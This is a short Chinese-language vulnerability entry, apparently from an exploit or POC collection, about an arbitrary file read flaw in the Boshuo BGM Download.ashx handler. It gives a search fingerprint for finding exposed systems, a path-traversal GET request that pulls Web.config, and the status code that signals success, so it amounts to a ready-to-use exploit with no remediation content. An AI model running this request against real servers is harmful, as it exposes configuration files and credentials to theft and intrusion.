# 博硕BGMDownload.ashx存在任意文件读取漏洞

博硕 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="Libs/Platform.lib"`
- **请求**：`GET /WebUpload/Download.ashx?fname=&path=/../Web.config HTTP/1.1`
- **响应特征**：200